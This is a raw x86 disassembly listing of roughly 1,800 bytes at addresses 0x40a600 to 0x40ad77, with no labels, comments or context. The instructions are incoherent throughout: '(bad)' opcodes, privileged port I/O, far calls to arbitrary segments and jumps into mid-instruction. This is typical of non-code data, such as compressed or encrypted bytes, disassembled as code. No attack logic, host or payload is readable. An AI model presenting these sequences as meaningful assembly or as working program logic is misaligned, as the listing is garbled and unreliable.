  40a600:	dec    edx
  40a601:	and    BYTE PTR [edx+0xf],bl
  40a604:	xchg   esp,eax
  40a605:	cli    
  40a606:	mov    edx,0x868cf1ac
  40a60b:	sbb    al,0x95
  40a60d:	push   esi
  40a60e:	sbb    edx,DWORD PTR [edi+0x78e5b961]
  40a614:	aam    0x46
  40a616:	int    0x5
  40a618:	int3   
  40a619:	or     ebx,DWORD PTR [edx+eiz*8]
  40a61c:	test   eax,ebp
  40a61e:	pop    es
  40a61f:	aad    0xec
  40a621:	sti    
  40a622:	(bad)  
  40a623:	cmc    
  40a624:	lods   eax,DWORD PTR ds:[esi]
  40a625:	out    dx,eax
  40a626:	push   ebp
  40a627:	mov    esp,0x8d1ee329
  40a62c:	mov    ecx,0xb355a5c
  40a631:	sti    
  40a632:	into   
  40a633:	test   BYTE PTR [edi+0x58],ah
  40a636:	add    al,0x34
  40a638:	adc    al,BYTE PTR [eax+0x16]
  40a63b:	sub    BYTE PTR [ecx+0x29],dh
  40a63e:	fstp   TBYTE PTR [ebp+0x23]
  40a641:	lahf   
  40a642:	push   ebp
  40a643:	mov    eax,ds:0xb426a1ea
  40a648:	icebp  
  40a649:	cmc    
  40a64a:	lea    edi,[edi+0x23]
  40a64d:	mov    dl,0xda
  40a64f:	les    ebx,FWORD PTR [edi-0x28]
  40a652:	stos   BYTE PTR es:[edi],al
  40a653:	inc    ebx
  40a654:	stos   BYTE PTR es:[edi],al
  40a655:	cmp    edx,DWORD PTR [eax+0x37]
  40a658:	or     eax,0x88dfad9d
  40a65d:	adc    eax,0xa073700e
  40a662:	repz lea eax,[ebx+eiz*2+0x6003ed1c]
  40a66a:	cmp    esp,ecx
  40a66c:	lahf   
  40a66d:	fisub  DWORD PTR [ecx+0x6b6a2eb6]
  40a673:	adc    al,0x29
  40a675:	popf   
  40a676:	dec    ebp
  40a677:	xchg   esi,eax
  40a678:	jo     0x40a6be
  40a67a:	sub    eax,0x73368d58
  40a67f:	pop    eax
  40a680:	adc    BYTE PTR [esi+0x48],ah
  40a683:	cli    
  40a684:	xchg   esp,eax
  40a685:	mov    ebx,0x149cad4a
  40a68a:	and    al,0xf4
  40a68c:	es idiv esp
  40a68f:	mov    edx,0x61286973
  40a694:	cli    
  40a695:	js     0x40a6df
  40a697:	mov    eax,ds:0xfd9a7a90
  40a69c:	sahf   
  40a69d:	fstp   DWORD PTR [ebx]
  40a69f:	and    eax,0xe4dbeaa8
  40a6a4:	repz fcmove st,st(5)
  40a6a7:	adc    DWORD PTR [edi+0x297d2a7d],edi
  40a6ad:	(bad)  
  40a6ae:	ja     0x40a67c
  40a6b0:	leave  
  40a6b1:	jmp    0x44b014f
  40a6b6:	aas    
  40a6b7:	mov    cl,0x7e
  40a6b9:	stos   BYTE PTR es:[edi],al
  40a6ba:	mov    ebp,0x52bda586
  40a6bf:	int3   
  40a6c0:	mov    bh,ah
  40a6c2:	and    BYTE PTR [esi-0x7b372471],dl
  40a6c8:	leave  
  40a6c9:	shl    esi,1
  40a6cb:	(bad)  
  40a6cd:	mov    edx,DWORD PTR [ecx-0x62636e89]
  40a6d3:	cdq    
  40a6d4:	jno    0x40a6b8
  40a6d6:	stc    
  40a6d7:	js     0x40a67b
  40a6d9:	pop    esi
  40a6da:	jno    0x40a674
  40a6dc:	sbb    esi,edx
  40a6de:	test   al,0x83
  40a6e0:	xchg   esp,eax
  40a6e1:	pop    ebp
  40a6e2:	dec    ebx
  40a6e3:	pusha  
  40a6e4:	mov    esi,DWORD PTR [esi]
  40a6e6:	push   DWORD PTR [ebx]
  40a6e8:	retf   0x95
  40a6eb:	in     eax,dx
  40a6ec:	sub    al,0xd6
  40a6ee:	inc    esp
  40a6ef:	fdivr  QWORD PTR [esi+0x77]
  40a6f2:	es nop
  40a6f4:	jne    0x40a6a4
  40a6f6:	add    DWORD PTR [ecx-0x10],esi
  40a6f9:	test   DWORD PTR [esp+eax*1],edi
  40a6fc:	sar    DWORD PTR [ebp-0x2d],1
  40a6ff:	mov    edi,0x8639ba2d
  40a704:	mov    cl,0x4c
  40a706:	mov    edx,0x7a467c77
  40a70b:	leave  
  40a70c:	push   ss
  40a70d:	dec    ecx
  40a70e:	pop    edx
  40a70f:	or     al,0x72
  40a711:	dec    esi
  40a712:	stos   DWORD PTR es:[edi],eax
  40a713:	sbb    DWORD PTR [ecx-0x64],esi
  40a716:	pop    edx
  40a717:	dec    esi
  40a718:	out    dx,al
  40a719:	pop    eax
  40a71a:	sbb    edi,DWORD PTR [edi]
  40a71c:	add    al,0x59
  40a71e:	test   al,0xc9
  40a720:	sub    eax,0x792d527b
  40a725:	repz sbb DWORD PTR [ebx-0x21],esi
  40a729:	and    cl,BYTE PTR [esp+esi*2+0x1b]
  40a72d:	inc    esi
  40a72e:	sti    
  40a72f:	mov    WORD PTR [esi+0x314bc5a7],?
  40a735:	hlt    
  40a736:	mov    ecx,edx
  40a738:	cwde   
  40a739:	push   esp
  40a73a:	mov    gs,WORD PTR [esi+0x7]
  40a73d:	retf   0x3df9
  40a740:	fbstp  TBYTE PTR [ebx]
  40a742:	mov    edi,0x60964eab
  40a747:	adc    eax,0x495039e6
  40a74c:	mov    bh,0xb4
  40a74e:	jmp    FWORD PTR [ebx]
  40a750:	out    dx,al
  40a751:	retf   
  40a752:	out    0xdf,al
  40a754:	adc    BYTE PTR [eax],dh
  40a756:	int3   
  40a757:	fcomp  DWORD PTR [edx+0x45d1ec80]
  40a75d:	daa    
  40a75e:	out    dx,eax
  40a75f:	mov    ebx,0x84c28298
  40a764:	mov    al,ds:0xd8736070
  40a769:	aas    
  40a76a:	jae    0x40a75a
  40a76c:	adc    eax,0x13e87867
  40a771:	add    eax,DWORD PTR [eax+0x547b4e7f]
  40a777:	mov    ah,0xb6
  40a779:	aam    0xe4
  40a77b:	xor    eax,0x1cd6ecd6
  40a780:	rol    cl,1
  40a782:	or     eax,0x17347d55
  40a787:	call   0xe580:0x78f4c996
  40a78e:	lods   eax,DWORD PTR ds:[esi]
  40a78f:	mov    eax,ds:0x4bd2426e
  40a794:	xchg   esi,eax
  40a795:	add    ah,BYTE PTR [esi-0x46]
  40a798:	jl     0x40a7e5
  40a79a:	xchg   ecx,eax
  40a79b:	ror    edx,cl
  40a79d:	sbb    dl,BYTE PTR [eax*2+0x2c826ab5]
  40a7a4:	loope  0x40a73f
  40a7a6:	cld    
  40a7a7:	xor    BYTE PTR [ecx],cl
  40a7a9:	cld    
  40a7aa:	sub    DWORD PTR [esp+eax*4-0x5a],ebp
  40a7ae:	lahf   
  40a7af:	jo     0x40a7b0
  40a7b1:	pop    eax
  40a7b2:	ja     0x40a7a7
  40a7b4:	cdq    
  40a7b5:	cmp    al,0x87
  40a7b7:	jg     0x40a784
  40a7b9:	push   0xffffffbe
  40a7bb:	repz inc edx
  40a7bd:	sub    BYTE PTR [edi+eax*8+0x43a01849],dh
  40a7c4:	xchg   esi,eax
  40a7c5:	jnp    0x40a812
  40a7c7:	scas   al,BYTE PTR es:[edi]
  40a7c8:	dec    ebp
  40a7c9:	cmp    eax,0xcc6dcfbf
  40a7ce:	add    eax,DWORD PTR [esi+0x5f6b7a86]
  40a7d4:	rcl    BYTE PTR [edi],cl
  40a7d6:	test   BYTE PTR [eax],0x59
  40a7d9:	cmp    DWORD PTR [edi],ebp
  40a7db:	jbe    0x40a7e3
  40a7dd:	dec    esp
  40a7de:	call   0xb146e17d
  40a7e3:	fsubr  DWORD PTR [ecx-0x425c6a87]
  40a7e9:	ins    BYTE PTR es:[edi],dx
  40a7ea:	dec    esp
  40a7eb:	mov    BYTE PTR [esi+0x13e3bbd6],dl
  40a7f1:	inc    esi
  40a7f2:	xchg   ebx,eax
  40a7f3:	push   cs
  40a7f4:	jmp    0x8b2e:0x3c3a5683
  40a7fb:	(bad)  
  40a7fd:	mov    al,0x2a
  40a7ff:	inc    eax
  40a800:	sub    BYTE PTR [ebx-0x5e2584cc],cl
  40a806:	pusha  
  40a807:	mov    BYTE PTR [ebp-0x2f],cl
  40a80a:	adc    eax,DWORD PTR [eax+0x6de50053]
  40a810:	inc    eax
  40a811:	xchg   DWORD PTR [ebp+0x342bfcfb],eax
  40a817:	inc    DWORD PTR [esi-0x57]
  40a81a:	mov    bh,0x3d
  40a81c:	pushf  
  40a81d:	enter  0xbbbd,0x9d
  40a821:	xor    al,0xc2
  40a823:	or     edx,esi
  40a825:	cmp    DWORD PTR [eax],eax
  40a827:	xor    ch,BYTE PTR [ecx+0x71223f99]
  40a82d:	push   ebx
  40a82e:	push   cs
  40a82f:	mov    DWORD PTR [eax-0x16127e91],esp
  40a835:	jae    0x40a86a
  40a837:	shr    DWORD PTR [esi-0x5b],0x88
  40a83b:	fist   WORD PTR ds:0xfaa44dc8
  40a841:	add    DWORD PTR [eax],ebx
  40a843:	test   eax,0xedb2120
  40a848:	rcl    BYTE PTR [esi+0x183bbbe6],0x39
  40a84f:	clc    
  40a850:	cli    
  40a851:	mov    ah,0x2c
  40a853:	and    bh,BYTE PTR [ecx]
  40a855:	in     eax,0x36
  40a857:	inc    eax
  40a858:	test   BYTE PTR ds:0x2fd9e10d,cl
  40a85e:	mov    eax,0x4f81807f
  40a863:	sahf   
  40a864:	jb     0x40a8d1
  40a866:	sub    BYTE PTR [edx+edx*8],ch
  40a869:	into   
  40a86a:	xchg   esp,eax
  40a86b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a86c:	out    0xa6,eax
  40a86e:	mov    eax,DWORD PTR [bx+si-0x36]
  40a872:	test   al,0x39
  40a874:	pop    ecx
  40a875:	push   ecx
  40a876:	xchg   edi,eax
  40a877:	daa    
  40a878:	fstp   QWORD PTR [ebx+edx*4-0x29bd78c6]
  40a87f:	pop    ecx
  40a880:	hlt    
  40a881:	xor    dl,BYTE PTR [eax+0x1c]
  40a884:	dec    ebp
  40a885:	adc    eax,0x7c84aef4
  40a88a:	mov    al,BYTE PTR [esi-0x22]
  40a88d:	or     DWORD PTR [edx+0x2a],esp
  40a890:	out    dx,al
  40a891:	fmul   QWORD PTR [ecx+ebp*1+0x85df08a]
  40a898:	pop    ecx
  40a899:	pop    ss
  40a89a:	adc    BYTE PTR [esi],dh
  40a89c:	sub    eax,0x5726316f
  40a8a1:	inc    edx
  40a8a2:	or     edi,ebp
  40a8a4:	pop    edx
  40a8a5:	fs pop edi
  40a8a7:	cmp    al,bh
  40a8a9:	mov    edi,0xe8273979
  40a8ae:	dec    esp
  40a8af:	pusha  
  40a8b0:	ins    BYTE PTR es:[edi],dx
  40a8b1:	sbb    BYTE PTR [eax-0x3a],ch
  40a8b4:	mov    ds:0x41dc406a,al
  40a8b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8ba:	aam    0x5a
  40a8bc:	pop    edx
  40a8bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8be:	div    BYTE PTR [esi+0x696f010f]
  40a8c4:	pop    esp
  40a8c5:	int    0xbe
  40a8c7:	ror    DWORD PTR [ebx+esi*2],0x23
  40a8cb:	dec    ecx
  40a8cc:	(bad)  [esi+0x78bc3d1c]
  40a8d2:	adc    eax,0x7e97a6f5
  40a8d7:	aad    0xa9
  40a8d9:	adc    eax,0x58155ec9
  40a8de:	repnz in al,dx
  40a8e0:	mov    esp,0xaa4f8e01
  40a8e5:	daa    
  40a8e6:	and    BYTE PTR [eax-0x5b],ch
  40a8e9:	adc    eax,0x8a1db3d6
  40a8ee:	push   ss
  40a8ef:	jle    0x40a892
  40a8f1:	inc    ecx
  40a8f2:	sahf   
  40a8f3:	or     edi,DWORD PTR [edx]
  40a8f5:	loopne 0x40a920
  40a8f7:	xchg   ebp,eax
  40a8f8:	call   FWORD PTR [ecx-0x6e069ee6]
  40a8fe:	fnstcw WORD PTR [ecx+0x75]
  40a901:	pop    ebp
  40a902:	push   edx
  40a903:	and    DWORD PTR [edi+0x2c6a3f0d],esi
  40a909:	enter  0x6b05,0xb7
  40a90d:	std    
  40a90e:	ja     0x40a8d1
  40a910:	or     cl,BYTE PTR [esi-0x5416502]
  40a916:	mov    ebp,0x4f7747c9
  40a91b:	rol    DWORD PTR [ebx-0x33b4c8d3],0xa8
  40a922:	mov    ebx,0xf49e491a
  40a927:	lods   eax,DWORD PTR ds:[esi]
  40a928:	mov    eax,ds:0x2a02d34f
  40a92d:	or     DWORD PTR [ebp+0x7c],edi
  40a930:	mov    bl,0xb2
  40a932:	loope  0x40a91d
  40a934:	imul   edi,esi,0xfffffff6
  40a937:	das    
  40a938:	out    0x29,eax
  40a93a:	bound  ecx,QWORD PTR [esi+0x3b]
  40a93d:	xchg   BYTE PTR [edx-0x5c],bh
  40a940:	lahf   
  40a941:	mov    al,0x6c
  40a943:	push   eax
  40a944:	and    al,0x61
  40a946:	mov    DWORD PTR [ecx+0x48],esi
  40a949:	(bad)
  40a94d:	sub    ebx,DWORD PTR [ecx]
  40a94f:	xchg   esp,eax
  40a950:	xchg   esp,eax
  40a951:	enter  0xde3f,0x97
  40a955:	push   ss
  40a956:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40a958:	inc    esp
  40a959:	fadd   DWORD PTR [edi]
  40a95b:	stos   DWORD PTR es:[edi],eax
  40a95c:	cmp    BYTE PTR [eax+0x79afa060],bl
  40a962:	jnp    0x40a959
  40a964:	jae    0x40a9c4
  40a966:	retf   
  40a967:	pop    ebx
  40a968:	pusha  
  40a969:	jne    0x40a940
  40a96b:	add    DWORD PTR [ebp-0x5a],ebx
  40a96e:	jno    0x40a9e7
  40a970:	(bad)  
  40a974:	(bad)  
  40a975:	pusha  
  40a976:	daa    
  40a977:	xlat   BYTE PTR ds:[ebx]
  40a978:	pop    es
  40a979:	and    eax,0xe9fbfbaa
  40a97e:	push   0x45ca5885
  40a983:	mov    ds:0x41296610,eax
  40a988:	sub    DWORD PTR [ebx],edx
  40a98a:	ins    BYTE PTR es:[edi],dx
  40a98b:	mov    ch,0x66
  40a98d:	setae  bh
  40a990:	shl    BYTE PTR [ecx],1
  40a992:	stos   BYTE PTR es:[edi],al
  40a993:	fidivr WORD PTR [edi]
  40a995:	test   al,0xf9
  40a997:	lds    esp,FWORD PTR [ecx]
  40a999:	call   FWORD PTR [ecx+0x28]
  40a99c:	cs shl bl,1
  40a99f:	das    
  40a9a0:	hlt    
  40a9a1:	xchg   edi,eax
  40a9a2:	das    
  40a9a3:	adc    al,0x71
  40a9a5:	fwait
  40a9a6:	and    ch,ch
  40a9a8:	dec    ecx
  40a9a9:	xchg   esp,eax
  40a9aa:	int3   
  40a9ab:	mov    eax,ds:0x26b44b7a
  40a9b0:	or     al,0x63
  40a9b2:	shl    BYTE PTR [eax+eiz*4-0x799a03a9],0x46
  40a9ba:	sbb    DWORD PTR [esi],ebx
  40a9bc:	outs   dx,BYTE PTR ds:[esi]
  40a9bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9be:	mov    WORD PTR [edi],?
  40a9c0:	icebp  
  40a9c1:	loop   0x40a9fc
  40a9c3:	or     eax,0xa8a5b092
  40a9c8:	stos   DWORD PTR es:[edi],eax
  40a9c9:	lea    edx,[ebx+0x1d29fa60]
  40a9cf:	cwde   
  40a9d0:	in     eax,0xfe
  40a9d2:	cmp    DWORD PTR [ecx],edi
  40a9d4:	sub    DWORD PTR [esi+0x61],0xfb16319d
  40a9db:	push   es
  40a9dc:	mov    edx,0x2a3b2a49
  40a9e1:	mov    dh,0x12
  40a9e3:	shr    DWORD PTR [ecx-0x4b],0x22
  40a9e7:	xchg   edx,eax
  40a9e8:	push   0xa80fbfe6
  40a9ed:	sbb    al,0xd4
  40a9ef:	and    esi,DWORD PTR [ecx+0x75]
  40a9f2:	repz es (bad) 
  40a9f5:	cmp    edx,ebx
  40a9f7:	fucom  st(6)
  40a9f9:	mov    ch,0x1b
  40a9fb:	mov    edx,0xd32f00c6
  40aa00:	ds leave 
  40aa02:	adc    eax,0x75ed112d
  40aa07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa08:	sbb    cl,bl
  40aa0a:	cmp    DWORD PTR [edi],0xffffffed
  40aa0d:	in     eax,0x52
  40aa0f:	mov    BYTE PTR [ebp+0x71],dl
  40aa12:	dec    ebp
  40aa13:	mov    BYTE PTR ds:0x60bc8e88,dl
  40aa19:	lods   al,BYTE PTR ds:[esi]
  40aa1a:	xchg   ecx,eax
  40aa1b:	daa    
  40aa1c:	mov    dl,0xdf
  40aa1e:	jle    0x40aa1f
  40aa20:	pop    esi
  40aa21:	lods   al,BYTE PTR ds:[esi]
  40aa22:	adc    DWORD PTR [edi+0x73439bc7],esi
  40aa28:	xchg   edi,eax
  40aa29:	sar    BYTE PTR [ebx+0x3da95f49],1
  40aa2f:	jae    0x40aa66
  40aa31:	cmp    eax,DWORD PTR ds:0x65355ea8
  40aa37:	out    0xf6,al
  40aa39:	add    eax,ecx
  40aa3b:	ret    
  40aa3c:	shr    BYTE PTR [ebx+0x51],cl
  40aa3f:	sub    al,0x22
  40aa41:	or     al,0x5a
  40aa43:	inc    esp
  40aa44:	loope  0x40aa39
  40aa46:	adc    DWORD PTR [ecx-0x1c6eb030],ecx
  40aa4c:	push   ss
  40aa4d:	popf   
  40aa4e:	push   0xffffffc4
  40aa50:	jae    0x40aabc
  40aa52:	adc    eax,0xffbfeec2
  40aa57:	add    BYTE PTR [ebx-0x3b06ba31],bh
  40aa5d:	add    dl,BYTE PTR [edi]
  40aa5f:	int3   
  40aa60:	jo     0x40aa80
  40aa62:	and    cl,BYTE PTR [ebp+0x45]
  40aa65:	push   ds
  40aa66:	ins    DWORD PTR es:[edi],dx
  40aa67:	xchg   edi,eax
  40aa68:	scas   al,BYTE PTR es:[edi]
  40aa69:	mov    edx,edi
  40aa6b:	or     BYTE PTR [esi-0x68],0x3f
  40aa6f:	push   edx
  40aa70:	or     al,0xa3
  40aa72:	or     eax,0x50d91609
  40aa77:	in     al,dx
  40aa78:	test   eax,0x1c985aea
  40aa7d:	mov    dh,0xa7
  40aa7f:	pop    ds
  40aa80:	sub    DWORD PTR [ecx+0x4e],ebx
  40aa83:	cdq    
  40aa84:	dec    edx
  40aa85:	not    DWORD PTR [eax+0x37]
  40aa88:	imul   ecx,DWORD PTR [eax],0xffffffa6
  40aa8b:	mov    edi,0x1fc6299
  40aa90:	pop    ebx
  40aa91:	or     bl,BYTE PTR [edi]
  40aa93:	in     al,0xe6
  40aa95:	bound  esi,QWORD PTR [esi]
  40aa97:	push   esi
  40aa98:	sbb    dl,BYTE PTR es:[ebx+0x33]
  40aa9c:	mov    ebx,0x90bc9056
  40aaa1:	xchg   ecx,eax
  40aaa2:	das    
  40aaa3:	retf   0x7fb8
  40aaa6:	call   0x5608eda9
  40aaab:	stc    
  40aaac:	mov    cl,0xdf
  40aaae:	sub    BYTE PTR [eax],cl
  40aab0:	scas   al,BYTE PTR es:[edi]
  40aab1:	sub    al,0x2f
  40aab3:	cmp    eax,0x13b9862b
  40aab8:	in     al,dx
  40aab9:	mov    cl,0x84
  40aabb:	loop   0x40aaf3
  40aabd:	add    eax,0x3e52acf
  40aac2:	popf   
  40aac3:	adc    edi,DWORD PTR [ebx]
  40aac5:	jns    0x40ab11
  40aac7:	arpl   WORD PTR [edi],bx
  40aac9:	in     eax,dx
  40aaca:	add    BYTE PTR [eax-0x58],ch
  40aacd:	xor    DWORD PTR [edi+0x308b8c22],eax
  40aad3:	jle    0x40aa8b
  40aad5:	inc    ecx
  40aad6:	cmp    eax,0x1d3ac9cf
  40aadb:	hlt    
  40aadc:	jno    0x40aae1
  40aade:	push   0x6fc39216
  40aae3:	and    eax,0xddd90376
  40aae8:	push   0x19069ab5
  40aaed:	int    0x6b
  40aaef:	jno    0x40ab69
  40aaf1:	mov    ds:0xcd14143b,eax
  40aaf6:	add    eax,0xe51085b6
  40aafb:	mov    ds:0xfee62638,eax
  40ab00:	outs   dx,DWORD PTR ds:[esi]
  40ab01:	xchg   DWORD PTR [edi-0x2c],ebx
  40ab04:	sti    
  40ab05:	aam    0x77
  40ab07:	and    BYTE PTR [esi-0x38],0xdf
  40ab0b:	xchg   esi,eax
  40ab0c:	(bad)  
  40ab0d:	test   DWORD PTR [ecx-0x45],0x83d86148
  40ab14:	and    DWORD PTR [ebx+0x28b19fa2],esp
  40ab1a:	jnp    0x40aae0
  40ab1c:	xor    eax,0x1b51d1a7
  40ab21:	repz mov ss,WORD PTR [edx+0x6f0cef]
  40ab28:	or     DWORD PTR [eax+edi*4-0x5e],ecx
  40ab2c:	mov    ebp,0x394359fa
  40ab31:	adc    al,0x47
  40ab33:	mov    al,ds:0xf4297a70
  40ab38:	add    dh,BYTE PTR [ebp-0x2bacc3ce]
  40ab3e:	dec    BYTE PTR [ebp-0x7c6012e4]
  40ab44:	ror    al,cl
  40ab46:	push   eax
  40ab47:	dec    eax
  40ab48:	aam    0xb2
  40ab4a:	cdq    
  40ab4b:	sbb    bl,BYTE PTR [esi+edi*4-0x2]
  40ab4f:	jb     0x40ab55
  40ab51:	pop    es
  40ab52:	sub    DWORD PTR [ebx-0x5f69c072],ebp
  40ab58:	adc    dl,BYTE PTR [ebx+0x139c13c9]
  40ab5e:	jns    0x40aaff
  40ab60:	sub    BYTE PTR [edx+eiz*1-0x6a926e46],bh
  40ab67:	hlt    
  40ab68:	xchg   edx,eax
  40ab69:	push   esp
  40ab6a:	in     eax,dx
  40ab6b:	push   ebx
  40ab6c:	and    esi,DWORD PTR [ebx-0x4449b50c]
  40ab72:	leave  
  40ab73:	mov    BYTE PTR [ebp+0x5c0dd3ff],al
  40ab79:	outs   dx,BYTE PTR ds:[esi]
  40ab7a:	cmp    eax,0x5414043d
  40ab7f:	xlat   BYTE PTR ds:[ebx]
  40ab80:	loop   0x40ab1e
  40ab82:	inc    ebp
  40ab83:	fdivp  st(2),st
  40ab85:	(bad)  
  40ab86:	adc    DWORD PTR [ebp+0x5f8afa44],edi
  40ab8c:	inc    esi
  40ab8d:	sbb    al,0xbd
  40ab8f:	cmp    dl,BYTE PTR [ebx-0x8]
  40ab92:	or     ch,ch
  40ab94:	fwait
  40ab95:	mov    WORD PTR [edi],es
  40ab97:	xor    eax,ecx
  40ab99:	in     al,dx
  40ab9a:	mov    ebx,0x4ecbb9f1
  40ab9f:	xchg   edi,eax
  40aba0:	cmp    BYTE PTR [edi+0x7f],bh
  40aba3:	mov    ds:0xa0059b05,eax
  40aba8:	aaa    
  40aba9:	(bad)  
  40abaa:	push   ebp
  40abab:	ja     0x40ab97
  40abad:	sub    DWORD PTR [ecx-0xf],esi
  40abb0:	inc    eax
  40abb1:	mov    ds:0x85d1b4b0,al
  40abb6:	jmp    0xc6c07743
  40abbb:	int    0x39
  40abbd:	sub    eax,0x69ec0932
  40abc2:	shl    BYTE PTR [ebx],1
  40abc4:	mul    DWORD PTR [edi]
  40abc6:	xor    DWORD PTR [eax],ebx
  40abc8:	mov    bh,0x42
  40abca:	cli    
  40abcb:	es jo  0x40ab6f
  40abce:	sub    DWORD PTR [ecx-0x28],ecx
  40abd1:	adc    eax,0x932badea
  40abd6:	fwait
  40abd7:	stos   DWORD PTR es:[edi],eax
  40abd8:	sbb    al,0xe1
  40abda:	mov    ah,0xcb
  40abdc:	mov    dl,0x1d
  40abde:	scas   eax,DWORD PTR es:[edi]
  40abdf:	dec    esi
  40abe0:	mov    ebx,0x80040305
  40abe5:	repnz sbb ecx,0x58
  40abe9:	out    0x7c,eax
  40abeb:	mov    bh,0x75
  40abed:	hlt    
  40abee:	sti    
  40abef:	fnstcw WORD PTR [esi+0x953ace4]
  40abf5:	(bad)  
  40abf6:	cmc    
  40abf7:	(bad)  [ebx-0x73421dcb]
  40abfd:	das    
  40abfe:	mov    cl,0x33
  40ac00:	pusha  
  40ac01:	mov    WORD PTR [edx],?
  40ac03:	inc    ebp
  40ac04:	pop    es
  40ac05:	cs leave 
  40ac07:	pop    ebx
  40ac08:	cmp    dh,BYTE PTR [esi-0x80]
  40ac0b:	fcomp  QWORD PTR ds:0x454dcf33
  40ac11:	jae    0x40ac28
  40ac13:	cli    
  40ac14:	(bad)  
  40ac15:	test   BYTE PTR [edx-0x2c3d15d5],0x51
  40ac1c:	mov    ah,BYTE PTR [ebx]
  40ac1e:	mov    edx,DWORD PTR [edi-0xf58dc88]
  40ac24:	or     DWORD PTR [ecx],edx
  40ac26:	ins    DWORD PTR es:[edi],dx
  40ac27:	add    eax,0x9a3cefa0
  40ac2c:	adc    ecx,esi
  40ac2e:	call   0x72ad:0xab960ab4
  40ac35:	fisub  DWORD PTR [ecx+0x35]
  40ac38:	mov    esp,0x3e7b9805
  40ac3d:	push   ebx
  40ac3e:	fdiv   st(5),st
  40ac40:	aam    0x4e
  40ac42:	jo     0x40ac0b
  40ac44:	dec    ecx
  40ac45:	cmp    eax,0xdb3a2ab1
  40ac4a:	cld    
  40ac4b:	fs cdq 
  40ac4d:	dec    esp
  40ac4e:	jge    0x40ac73
  40ac50:	mov    esp,0x45cc06e7
  40ac55:	lea    edi,[edx]
  40ac57:	mov    al,ds:0x5a274177
  40ac5c:	sub    al,0x53
  40ac5e:	cwde   
  40ac5f:	jb     0x40ac0b
  40ac61:	call   0x4544b326
  40ac66:	jnp    0x40ac61
  40ac68:	dec    edx
  40ac69:	js     0x40ac12
  40ac6b:	aad    0x7b
  40ac6d:	stos   DWORD PTR es:[edi],eax
  40ac6e:	mov    BYTE PTR ds:0xf88a663f,al
  40ac74:	xor    eax,0x6933b205
  40ac79:	loope  0x40ac22
  40ac7b:	(bad)  
  40ac7c:	mov    ebp,0x4ce311d0
  40ac81:	mov    ds:0xb8d4066d,eax
  40ac86:	xor    al,0xd0
  40ac88:	mov    cl,0xa9
  40ac8a:	out    0xb3,al
  40ac8c:	pop    ds
  40ac8d:	enter  0x20b5,0x85
  40ac91:	mov    ch,0x2a
  40ac93:	xchg   esp,eax
  40ac94:	daa    
  40ac95:	lea    eax,[ebx-0x9]
  40ac98:	pop    edi
  40ac99:	sbb    eax,0xa62366ab
  40ac9e:	test   DWORD PTR [edx],ecx
  40aca0:	inc    ebp
  40aca1:	psrad  mm1,QWORD PTR [edi]
  40aca4:	ret    
  40aca5:	mov    dh,0x54
  40aca7:	lods   al,BYTE PTR ds:[esi]
  40aca8:	push   ds
  40aca9:	sbb    al,0x16
  40acab:	and    al,0xcf
  40acad:	aaa    
  40acae:	test   BYTE PTR [ecx+0x43],dh
  40acb1:	xchg   edi,eax
  40acb2:	aam    0x88
  40acb4:	imul   esp,edi,0xd3f26989
  40acba:	jge    0x40ad03
  40acbc:	imul   esp,ebx,0xffffffbd
  40acbf:	dec    edx
  40acc0:	mov    cl,0x77
  40acc2:	leave  
  40acc3:	jne    0x40acbd
  40acc5:	in     al,0x99
  40acc7:	loope  0x40aca9
  40acc9:	pop    ss
  40acca:	or     eax,0x981ba93a
  40accf:	das    
  40acd0:	push   ebx
  40acd1:	call   0x1a9c:0x361cfee6
  40acd8:	inc    edi
  40acd9:	jge    0x40ac5c
  40acdb:	stc    
  40acdc:	or     BYTE PTR [ecx+eiz*1-0xd],dh
  40ace0:	sahf   
  40ace1:	cmp    BYTE PTR [ebx-0x6c],0x76
  40ace5:	lods   eax,DWORD PTR ds:[esi]
  40ace6:	jo     0x40acba
  40ace8:	push   0x4bd52706
  40aced:	push   cs
  40acee:	adc    ecx,DWORD PTR [esi+0x5624657f]
  40acf4:	pop    eax
  40acf5:	mov    bh,0xa3
  40acf7:	push   eax
  40acf8:	xchg   esp,eax
  40acf9:	gs push ecx
  40acfb:	cli    
  40acfc:	fist   DWORD PTR [ecx-0x5a]
  40acff:	dec    esi
  40ad00:	test   BYTE PTR [eax+0x2f],ah
  40ad03:	inc    edi
  40ad04:	push   ebx
  40ad05:	push   ecx
  40ad06:	adc    DWORD PTR gs:[esi],edx
  40ad09:	push   cs
  40ad0a:	and    BYTE PTR [edx],bh
  40ad0c:	inc    ebp
  40ad0d:	test   BYTE PTR [ebx-0x37],al
  40ad10:	push   cs
  40ad11:	push   edx
  40ad12:	stc    
  40ad13:	into   
  40ad14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad15:	ret    
  40ad16:	(bad)  
  40ad17:	lock dec edx
  40ad19:	xor    BYTE PTR [eax+esi*8],0xab
  40ad1d:	mov    dh,0x36
  40ad1f:	xor    al,0x9b
  40ad21:	paddq  mm4,mm4
  40ad24:	outs   dx,BYTE PTR ds:[esi]
  40ad25:	(bad)  
  40ad26:	pop    DWORD PTR [esi]
  40ad28:	sti    
  40ad29:	pop    eax
  40ad2a:	call   0x51dea9a5
  40ad2f:	aas    
  40ad30:	call   0x25cd:0xb03b92d3
  40ad37:	pop    esp
  40ad38:	push   ebp
  40ad39:	jl     0x40ad03
  40ad3b:	add    BYTE PTR [eax+0x42cc45d],cl
  40ad41:	inc    edi
  40ad42:	pop    ecx
  40ad43:	dec    ecx
  40ad44:	xchg   ebp,eax
  40ad45:	push   esp
  40ad46:	inc    edx
  40ad47:	push   ebp
  40ad48:	shl    DWORD PTR [edx+0x4d],0xf7
  40ad4c:	xchg   esp,eax
  40ad4d:	push   esp
  40ad4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad4f:	call   0xf51e:0x367a1c43
  40ad56:	mov    cl,0xc0
  40ad58:	cld    
  40ad59:	lods   al,BYTE PTR ds:[esi]
  40ad5a:	gs ror edx,0xb4
  40ad5e:	ret    
  40ad5f:	jmp    0x194c:0x4d8b9571
  40ad66:	icebp  
  40ad67:	push   esp
  40ad68:	push   eax
  40ad69:	add    al,0x16
  40ad6b:	jmp    0x8462:0x85cd8b58
  40ad72:	mov    al,ds:0x4be36f7c
  40ad77:	pop    esi
